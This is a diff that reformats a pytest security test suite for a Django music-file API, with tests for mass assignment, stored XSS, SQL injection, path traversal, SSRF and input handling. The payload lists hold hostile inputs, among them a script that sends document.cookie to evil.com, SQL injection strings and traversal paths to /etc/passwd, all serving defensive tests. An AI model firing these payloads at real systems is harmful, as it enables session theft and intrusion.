@@ -6,16 +6,15 @@ OWASP API Top 10 2023: API3:2023 BOPLA, API8:2023 Security Misconfiguration
 """
 
 import json
+
 import pytest
-from datetime import timedelta
-from decimal import Decimal
+
+from django.conf import settings
 from model_bakery import baker
 from rest_framework.test import APIClient
-from django.conf import settings
 
-from api.core.models import User, Role
+from api.core.models import Role, User
 from api.storage.models import File, Library
-
 
 # XSS payloads for stored XSS test
 XSS_PAYLOADS = [
@@ -28,7 +27,10 @@ XSS_PAYLOADS = [
     ('"><script>alert(1)</script>', "quote_breakout"),
     ("'-'\"><script>alert(1)</script>", "complex_breakout"),
     ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
-    ('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil"),
+    (
+        '<script>fetch("https://evil.com?c="+document.cookie)</script>',
+        "data_exfil",
+    ),
 ]
 
 # SQLi payloads for text fields
@@ -39,7 +41,7 @@ SQLI_PAYLOADS = [
     ("1' AND 1=1 --", "and_true"),
     ("'; INSERT INTO users VALUES ('hacker', 'pass') --", "insert_inject"),
     ("%' OR name LIKE '%", "like_wildcard"),
-    ("\\' OR \\\"1\\\"=\\\"1", "escaped_quotes"),
+    ('\\\' OR \\"1\\"=\\"1', "escaped_quotes"),
 ]
 
 # Path traversal payloads
@@ -98,16 +100,31 @@ TYPE_CONFUSION = [
 class TestMetadataMassAssignment:
     """API3:2023 - Broken Object Property Level Authorization via metadata."""
 
-    @pytest.mark.parametrize("field,value", [
-        ("id", 999999),
-        pytest.param("filepath", "/etc/passwd", marks=pytest.mark.xfail(reason="T884: filepath mass assignment", strict=True)),
-        ("md5", "a" * 32),
-        ("directory", "/root"),
-    ])
-    def test_mass_assignment_readonly_fields_blocked(self, field, value, api_client, faker):
+    @pytest.mark.parametrize(
+        "field,value",
+        [
+            ("id", 999999),
+            pytest.param(
+                "filepath",
+                "/etc/passwd",
+                marks=pytest.mark.xfail(
+                    reason="T884: filepath mass assignment", strict=True,
+                ),
+            ),
+            ("md5", "a" * 32),
+            ("directory", "/root"),
+        ],
+    )
+    def test_mass_assignment_readonly_fields_blocked(
+        self, field, value, api_client, faker,
+    ):
         """Read-only fields should not be modifiable via PATCH."""
-        user = baker.make(User, username=f"mass_ro_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="MASS", name="Mass", description="Test")
+        user = baker.make(
+            User, username=f"mass_ro_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="MASS", name="Mass", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="test.mp3",
@@ -133,17 +150,29 @@ class TestMetadataMassAssignment:
 
         # Verify field was not changed
         if field == "id":
-            assert file_obj.id == original_id, f"ID was changed via mass assignment!"
+            assert (
+                file_obj.id == original_id
+            ), "ID was changed via mass assignment!"
         elif field == "filepath":
-            assert file_obj.filepath == original_filepath, f"filepath was changed!"
+            assert (
+                file_obj.filepath == original_filepath
+            ), "filepath was changed!"
 
-    @pytest.mark.xfail(reason="BOPLA: Owner can be changed via metadata - T882", strict=True)
+    @pytest.mark.xfail(
+        reason="BOPLA: Owner can be changed via metadata - T882", strict=True,
+    )
     def test_mass_assignment_owner_field(self, api_client, faker):
         """Owner field should not be modifiable via metadata PATCH. (T882)"""
-        user_a = baker.make(User, username=f"own_a_{faker.user_name()}", role=Role.HOST)
-        user_b = baker.make(User, username=f"own_b_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="OWNER", name="Owner", description="Test")
-        
+        user_a = baker.make(
+            User, username=f"own_a_{faker.user_name()}", role=Role.HOST,
+        )
+        user_b = baker.make(
+            User, username=f"own_b_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="OWNER", name="Owner", description="Test",
+        )
+
         file_obj = baker.make(
             File,
             name="ownership_test.mp3",
@@ -166,13 +195,19 @@ class TestMetadataMassAssignment:
         file_obj.refresh_from_db()
 
         # Owner should not have changed
-        assert file_obj.owner_id == user_a.id, f"Owner changed to {file_obj.owner_id}"
+        assert (
+            file_obj.owner_id == user_a.id
+        ), f"Owner changed to {file_obj.owner_id}"
 
     @pytest.mark.xfail(reason="T885: created_at mass assignment", strict=True)
     def test_mass_assignment_created_at_blocked(self, api_client, faker):
         """created_at should be read-only. (T885)"""
-        user = baker.make(User, username=f"created_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="CREATED", name="Created", description="Test")
+        user = baker.make(
+            User, username=f"created_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="CREATED", name="Created", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="test.mp3",
@@ -193,29 +228,64 @@ class TestMetadataMassAssignment:
         )
 
         file_obj.refresh_from_db()
-        assert file_obj.created_at == original_created, "created_at was modified!"
+        assert (
+            file_obj.created_at == original_created
+        ), "created_at was modified!"
 
 
 @pytest.mark.django_db
 class TestMetadataXSSInjection:
     """Stored XSS via metadata fields."""
 
-    @pytest.mark.parametrize("payload,test_name", [
-        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
-        ("javascript:alert(1)", "javascript_proto"),
-        ('<svg onload="alert(1)">', "svg_onload"),
-        ('<iframe src="javascript:alert(1)">', "iframe_js"),
-        ('<body onload="alert(1)">', "body_onload"),
-        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
-        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-    ])
-    def test_xss_in_track_title_blocked(self, payload, test_name, api_client, faker):
+    @pytest.mark.parametrize(
+        "payload,test_name",
+        [
+            pytest.param(
+                "<script>alert(1)</script>",
+                "basic_script",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ('<img src=x onerror="alert(1)">', "img_onerror"),
+            ("javascript:alert(1)", "javascript_proto"),
+            ('<svg onload="alert(1)">', "svg_onload"),
+            ('<iframe src="javascript:alert(1)">', "iframe_js"),
+            ('<body onload="alert(1)">', "body_onload"),
+            pytest.param(
+                '"><script>alert(1)</script>',
+                "quote_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            pytest.param(
+                "'-'\"><script>alert(1)</script>",
+                "complex_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
+            pytest.param(
+                '<script>fetch("https://evil.com?c="+document.cookie)</script>',
+                "data_exfil",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+        ],
+    )
+    def test_xss_in_track_title_blocked(
+        self, payload, test_name, api_client, faker,
+    ):
         """XSS payloads in track_title should be sanitized or rejected."""
-        user = baker.make(User, username=f"xss_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="XSS", name="XSS", description="Test")
+        user = baker.make(
+            User, username=f"xss_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="XSS", name="XSS", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="xss_test.mp3",
@@ -239,25 +309,60 @@ class TestMetadataXSSInjection:
             # If accepted, should be sanitized (no raw script tags)
             data = response.json()
             stored_value = data.get("track_title", "")
-            assert "<script>" not in stored_value or "<script>" not in payload.lower(), \
-                f"Raw script tag stored: {test_name}"
+            assert (
+                "<script>" not in stored_value
+                or "<script>" not in payload.lower()
+            ), f"Raw script tag stored: {test_name}"
 
-    @pytest.mark.parametrize("payload,test_name", [
-        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
-        ("javascript:alert(1)", "javascript_proto"),
-        ('<svg onload="alert(1)">', "svg_onload"),
-        ('<iframe src="javascript:alert(1)">', "iframe_js"),
-        ('<body onload="alert(1)">', "body_onload"),
-        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
-        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-    ])
-    def test_xss_in_artist_name_blocked(self, payload, test_name, api_client, faker):
+    @pytest.mark.parametrize(
+        "payload,test_name",
+        [
+            pytest.param(
+                "<script>alert(1)</script>",
+                "basic_script",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ('<img src=x onerror="alert(1)">', "img_onerror"),
+            ("javascript:alert(1)", "javascript_proto"),
+            ('<svg onload="alert(1)">', "svg_onload"),
+            ('<iframe src="javascript:alert(1)">', "iframe_js"),
+            ('<body onload="alert(1)">', "body_onload"),
+            pytest.param(
+                '"><script>alert(1)</script>',
+                "quote_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            pytest.param(
+                "'-'\"><script>alert(1)</script>",
+                "complex_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
+            pytest.param(
+                '<script>fetch("https://evil.com?c="+document.cookie)</script>',
+                "data_exfil",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+        ],
+    )
+    def test_xss_in_artist_name_blocked(
+        self, payload, test_name, api_client, faker,
+    ):
         """XSS payloads in artist_name should be sanitized."""
-        user = baker.make(User, username=f"xss_art_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="XSSART", name="XSS", description="Test")
+        user = baker.make(
+            User, username=f"xss_art_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="XSSART", name="XSS", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="xss_artist.mp3",
@@ -281,24 +386,59 @@ class TestMetadataXSSInjection:
             data = response.json()
             stored = data.get("artist_name", "")
             if "<script>" in payload.lower():
-                assert "<script>" not in stored, f"XSS stored in artist_name: {test_name}"
+                assert (
+                    "<script>" not in stored
+                ), f"XSS stored in artist_name: {test_name}"
 
-    @pytest.mark.parametrize("payload,test_name", [
-        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
-        ("javascript:alert(1)", "javascript_proto"),
-        ('<svg onload="alert(1)">', "svg_onload"),
-        ('<iframe src="javascript:alert(1)">', "iframe_js"),
-        ('<body onload="alert(1)">', "body_onload"),
-        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
-        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
-    ])
-    def test_xss_in_album_title_blocked(self, payload, test_name, api_client, faker):
+    @pytest.mark.parametrize(
+        "payload,test_name",
+        [
+            pytest.param(
+                "<script>alert(1)</script>",
+                "basic_script",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ('<img src=x onerror="alert(1)">', "img_onerror"),
+            ("javascript:alert(1)", "javascript_proto"),
+            ('<svg onload="alert(1)">', "svg_onload"),
+            ('<iframe src="javascript:alert(1)">', "iframe_js"),
+            ('<body onload="alert(1)">', "body_onload"),
+            pytest.param(
+                '"><script>alert(1)</script>',
+                "quote_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            pytest.param(
+                "'-'\"><script>alert(1)</script>",
+                "complex_breakout",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+            ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
+            pytest.param(
+                '<script>fetch("https://evil.com?c="+document.cookie)</script>',
+                "data_exfil",
+                marks=pytest.mark.xfail(
+                    reason="T883: Stored XSS", strict=True,
+                ),
+            ),
+        ],
+    )
+    def test_xss_in_album_title_blocked(
+        self, payload, test_name, api_client, faker,
+    ):
         """XSS payloads in album_title should be sanitized."""
-        user = baker.make(User, username=f"xss_alb_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="XSSALB", name="XSS", description="Test")
+        user = baker.make(
+            User, username=f"xss_alb_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="XSSALB", name="XSS", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="xss_album.mp3",
@@ -321,7 +461,9 @@ class TestMetadataXSSInjection:
             data = response.json()
             stored = data.get("album_title", "")
             if "<script>" in payload.lower():
-                assert "<script>" not in stored, f"XSS stored in album_title: {test_name}"
+                assert (
+                    "<script>" not in stored
+                ), f"XSS stored in album_title: {test_name}"
 
 
 @pytest.mark.django_db
@@ -329,10 +471,16 @@ class TestMetadataSQLInjection:
     """SQL injection via metadata fields."""
 
     @pytest.mark.parametrize("payload,test_name", SQLI_PAYLOADS)
-    def test_sqli_in_text_fields_no_crash(self, payload, test_name, api_client, faker):
+    def test_sqli_in_text_fields_no_crash(
+        self, payload, test_name, api_client, faker,
+    ):
         """SQLi in metadata fields should not cause 500 error."""
-        user = baker.make(User, username=f"sqli_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="SQLI", name="SQLI", description="Test")
+        user = baker.make(
+            User, username=f"sqli_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="SQLI", name="SQLI", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="sqli_test.mp3",
@@ -345,25 +493,36 @@ class TestMetadataSQLInjection:
         client.credentials(
             HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
         )
-        
+
         # Try SQLi in various text fields
-        text_fields = ["track_title", "artist_name", "album_title", "genre", "mood"]
-        
+        text_fields = [
+            "track_title",
+            "artist_name",
+            "album_title",
+            "genre",
+            "mood",
+        ]
+
         for field in text_fields:
             response = client.patch(
                 f"/api/v2/files/{file_obj.id}",
                 json.dumps({field: payload}),
                 content_type="application/json",
             )
-            
+
             # Should not crash with 500
-            assert response.status_code != 500, \
-                f"SQLi caused 500 in {field}: {test_name}"
+            assert (
+                response.status_code != 500
+            ), f"SQLi caused 500 in {field}: {test_name}"
 
     def test_sqli_in_filter_params(self, api_client, faker):
         """SQLi via filter/search parameters."""
-        user = baker.make(User, username=f"sqli_f_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="SQLIF", name="SQLIF", description="Test")
+        user = baker.make(
+            User, username=f"sqli_f_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="SQLIF", name="SQLIF", description="Test",
+        )
         baker.make(
             File,
             name="filter_test.mp3",
@@ -381,26 +540,58 @@ class TestMetadataSQLInjection:
         for filter_param in sqli_filters:
             response = api_client.get(f"/api/v2/files?{filter_param}")
             # Should not crash
-            assert response.status_code in [200, 400], \
-                f"SQLi filter caused error: {filter_param[:50]}"
+            assert response.status_code in [
+                200,
+                400,
+            ], f"SQLi filter caused error: {filter_param[:50]}"
 
 
 @pytest.mark.django_db
 class TestMetadataPathTraversal:
     """Path traversal via filepath and related fields."""
 
-    @pytest.mark.parametrize("payload,test_name", [
-        pytest.param("../../../etc/passwd", "unix_traversal", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
-        ("..\\..\\..\\windows\\system32\\config\\sam", "windows_traversal"),
-        pytest.param("....//....//....//etc/passwd", "double_dot_slash", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
-        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
-        pytest.param("/etc/passwd%00.jpg", "null_byte_evasion", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
-        ("../../../../../../etc/hosts", "deep_traversal"),
-    ])
-    def test_path_traversal_in_filepath_blocked(self, payload, test_name, api_client, faker):
+    @pytest.mark.parametrize(
+        "payload,test_name",
+        [
+            pytest.param(
+                "../../../etc/passwd",
+                "unix_traversal",
+                marks=pytest.mark.xfail(
+                    reason="T886: Path traversal", strict=True,
+                ),
+            ),
+            (
+                "..\\..\\..\\windows\\system32\\config\\sam",
+                "windows_traversal",
+            ),
+            pytest.param(
+                "....//....//....//etc/passwd",
+                "double_dot_slash",
+                marks=pytest.mark.xfail(
+                    reason="T886: Path traversal", strict=True,
+                ),
+            ),
+            ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
+            pytest.param(
+                "/etc/passwd%00.jpg",
+                "null_byte_evasion",
+                marks=pytest.mark.xfail(
+                    reason="T886: Path traversal", strict=True,
+                ),
+            ),
+            ("../../../../../../etc/hosts", "deep_traversal"),
+        ],
+    )
+    def test_path_traversal_in_filepath_blocked(
+        self, payload, test_name, api_client, faker,
+    ):
         """Path traversal in filepath should be blocked."""
-        user = baker.make(User, username=f"path_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="PATH", name="Path", description="Test")
+        user = baker.make(
+            User, username=f"path_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="PATH", name="Path", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="path_test.mp3",
@@ -425,14 +616,20 @@ class TestMetadataPathTraversal:
 
         # Path should not be changed to traversal
         if "passwd" in payload or ".." in payload:
-            assert file_obj.filepath == original_path or "/etc/passwd" not in file_obj.filepath, \
-                f"Path traversal accepted: {test_name}"
+            assert (
+                file_obj.filepath == original_path
+                or "/etc/passwd" not in file_obj.filepath
+            ), f"Path traversal accepted: {test_name}"
 
     @pytest.mark.xfail(reason="T886: Path traversal in directory", strict=True)
     def test_directory_traversal_in_metadata(self, api_client, faker):
         """Directory field path traversal. (T886)"""
-        user = baker.make(User, username=f"dir_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="DIR", name="Dir", description="Test")
+        user = baker.make(
+            User, username=f"dir_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="DIR", name="Dir", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="dir_test.mp3",
@@ -455,7 +652,9 @@ class TestMetadataPathTraversal:
         # Should reject or sanitize
         if response.status_code == 200:
             file_obj.refresh_from_db()
-            assert "../../../" not in file_obj.directory, "Directory traversal accepted"
+            assert (
+                "../../../" not in file_obj.directory
+            ), "Directory traversal accepted"
 
 
 @pytest.mark.django_db
@@ -464,8 +663,12 @@ class TestMetadataDataExfiltration:
 
     def test_metadata_length_limits(self, api_client, faker):
         """Very long metadata should be rejected or truncated."""
-        user = baker.make(User, username=f"len_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="LEN", name="Len", description="Test")
+        user = baker.make(
+            User, username=f"len_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="LEN", name="Len", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="len_test.mp3",
@@ -494,13 +697,20 @@ class TestMetadataDataExfiltration:
             )
 
             # Should not crash, might truncate or reject
-            assert response.status_code in [200, 400, 413], \
-                f"Long string caused error: {test_name}"
+            assert response.status_code in [
+                200,
+                400,
+                413,
+            ], f"Long string caused error: {test_name}"
 
     def test_binary_data_in_metadata(self, api_client, faker):
         """Binary data in metadata fields."""
-        user = baker.make(User, username=f"bin_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="BIN", name="Bin", description="Test")
+        user = baker.make(
+            User, username=f"bin_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="BIN", name="Bin", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="bin_test.mp3",
@@ -510,8 +720,8 @@ class TestMetadataDataExfiltration:
         )
 
         binary_strings = [
-            b"\x00\x01\x02\x03".decode('latin-1', errors='ignore'),
-            b"\xff\xfe".decode('latin-1', errors='ignore'),
+            b"\x00\x01\x02\x03".decode("latin-1", errors="ignore"),
+            b"\xff\xfe".decode("latin-1", errors="ignore"),
             "\x00",  # Null byte
         ]
 
@@ -527,8 +737,11 @@ class TestMetadataDataExfiltration:
                     json.dumps({"track_title": bin_str}),
                     content_type="application/json",
                 )
-                assert response.status_code in [200, 400], "Binary data caused error"
-            except Exception as e:
+                assert response.status_code in [
+                    200,
+                    400,
+                ], "Binary data caused error"
+            except Exception:
                 # Should handle gracefully
                 pass
 
@@ -538,10 +751,16 @@ class TestMetadataSSRF:
     """SSRF via metadata URL fields."""
 
     @pytest.mark.parametrize("payload,test_name", SSRF_PAYLOADS)
-    def test_ssrf_in_url_fields_blocked(self, payload, test_name, api_client, faker):
+    def test_ssrf_in_url_fields_blocked(
+        self, payload, test_name, api_client, faker,
+    ):
         """SSRF payloads in URL-like metadata fields."""
-        user = baker.make(User, username=f"ssrf_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="SSRF", name="SSRF", description="Test")
+        user = baker.make(
+            User, username=f"ssrf_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="SSRF", name="SSRF", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="ssrf_test.mp3",
@@ -573,10 +792,16 @@ class TestMetadataUnicodeAttacks:
     """Unicode normalization and homograph attacks."""
 
     @pytest.mark.parametrize("payload,test_name", UNICODE_ATTACKS)
-    def test_unicode_in_metadata_accepted(self, payload, test_name, api_client, faker):
+    def test_unicode_in_metadata_accepted(
+        self, payload, test_name, api_client, faker,
+    ):
         """Unicode should be handled properly in metadata."""
-        user = baker.make(User, username=f"uni_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="UNI", name="Uni", description="Test")
+        user = baker.make(
+            User, username=f"uni_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="UNI", name="Uni", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="uni_test.mp3",
@@ -596,8 +821,10 @@ class TestMetadataUnicodeAttacks:
         )
 
         # Should handle unicode gracefully (accept or reject, not crash)
-        assert response.status_code in [200, 400], \
-            f"Unicode caused error: {test_name}"
+        assert response.status_code in [
+            200,
+            400,
+        ], f"Unicode caused error: {test_name}"
 
     def test_unicode_normalization_security(self, api_client, faker):
         """Unicode normalization could bypass filters."""
@@ -608,8 +835,12 @@ class TestMetadataUnicodeAttacks:
             ("о", "cyrillic_o"),  # Cyrillic 'о' looks like latin 'o'
         ]
 
-        user = baker.make(User, username=f"norm_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="NORM", name="Norm", description="Test")
+        user = baker.make(
+            User, username=f"norm_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="NORM", name="Norm", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="norm_test.mp3",
@@ -638,8 +869,12 @@ class TestMetadataNumericOverflow:
 
     def test_integer_overflow_in_numeric_fields(self, api_client, faker):
         """Integer overflow in numeric metadata fields."""
-        user = baker.make(User, username=f"overflow_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="OVERFLOW", name="Overflow", description="Test")
+        user = baker.make(
+            User, username=f"overflow_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="OVERFLOW", name="Overflow", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="overflow_test.mp3",
@@ -663,20 +898,29 @@ class TestMetadataNumericOverflow:
         for value in overflow_values:
             response = client.patch(
                 f"/api/v2/files/{file_obj.id}",
-                json.dumps({
-                    "bit_rate": value,
-                    "sample_rate": value,
-                    "bpm": value,
-                }),
+                json.dumps(
+                    {
+                        "bit_rate": value,
+                        "sample_rate": value,
+                        "bpm": value,
+                    },
+                ),
                 content_type="application/json",
             )
             # Should handle gracefully
-            assert response.status_code in [200, 400], f"Overflow caused error: {value}"
+            assert response.status_code in [
+                200,
+                400,
+            ], f"Overflow caused error: {value}"
 
     def test_float_precision_issues(self, api_client, faker):
         """Float precision edge cases."""
-        user = baker.make(User, username=f"float_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="FLOAT", name="Float", description="Test")
+        user = baker.make(
+            User, username=f"float_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="FLOAT", name="Float", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="float_test.mp3",
@@ -686,9 +930,9 @@ class TestMetadataNumericOverflow:
         )
 
         weird_floats = [
-            float('inf'),
-            float('-inf'),
-            float('nan'),
+            float("inf"),
+            float("-inf"),
+            float("nan"),
             1e308,  # Very large
             1e-308,  # Very small
         ]
@@ -717,8 +961,12 @@ class TestMetadataSensitiveDataExposure:
 
     def test_no_internal_paths_in_response(self, api_client, faker):
         """Internal file paths should not be exposed."""
-        user = baker.make(User, username=f"path_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="PATH", name="Path", description="Test")
+        user = baker.make(
+            User, username=f"path_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="PATH", name="Path", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="path_test.mp3",
@@ -730,9 +978,9 @@ class TestMetadataSensitiveDataExposure:
 
         response = api_client.get(f"/api/v2/files/{file_obj.id}")
         assert response.status_code == 200
-        
+
         data = response.json()
-        
+
         # Should not expose full internal paths
         if "filepath" in data:
             filepath = data["filepath"]
@@ -741,8 +989,12 @@ class TestMetadataSensitiveDataExposure:
 
     def test_no_md5_of_sensitive_files(self, api_client, faker):
         """MD5 hashes could be used for malicious purposes."""
-        user = baker.make(User, username=f"md5_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="MD5", name="MD5", description="Test")
+        user = baker.make(
+            User, username=f"md5_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="MD5", name="MD5", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="md5_test.mp3",
@@ -754,7 +1006,7 @@ class TestMetadataSensitiveDataExposure:
 
         response = api_client.get(f"/api/v2/files/{file_obj.id}")
         assert response.status_code == 200
-        
+
         # MD5 is generally OK to expose, but verify it's handled correctly
         data = response.json()
         # Just verify response is valid JSON
@@ -766,7 +1018,9 @@ class TestMetadataContentTypeAttacks:
 
     def test_wrong_content_type_rejected(self, api_client, faker):
         """PATCH with wrong Content-Type should be rejected."""
-        user = baker.make(User, username=f"ct_{faker.user_name()}", role=Role.HOST)
+        user = baker.make(
+            User, username=f"ct_{faker.user_name()}", role=Role.HOST,
+        )
         library = baker.make(Library, code="CT", name="CT", description="Test")
         file_obj = baker.make(
             File,
@@ -780,7 +1034,7 @@ class TestMetadataContentTypeAttacks:
         client.credentials(
             HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
         )
-        
+
         # Try form-urlencoded instead of JSON
         response = client.patch(
             f"/api/v2/files/{file_obj.id}",
@@ -793,8 +1047,12 @@ class TestMetadataContentTypeAttacks:
 
     def test_json_merge_patch_handled(self, api_client, faker):
         """JSON Merge Patch should be handled correctly."""
-        user = baker.make(User, username=f"merge_{faker.user_name()}", role=Role.HOST)
-        library = baker.make(Library, code="MERGE", name="Merge", description="Test")
+        user = baker.make(
+            User, username=f"merge_{faker.user_name()}", role=Role.HOST,
+        )
+        library = baker.make(
+            Library, code="MERGE", name="Merge", description="Test",
+        )
         file_obj = baker.make(
             File,
             name="merge_test.mp3",
@@ -807,7 +1065,7 @@ class TestMetadataContentTypeAttacks:
         client.credentials(
             HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
         )
-        
+
         response = client.patch(
             f"/api/v2/files/{file_obj.id}",
             json.dumps({"track_title": "Merged"}),
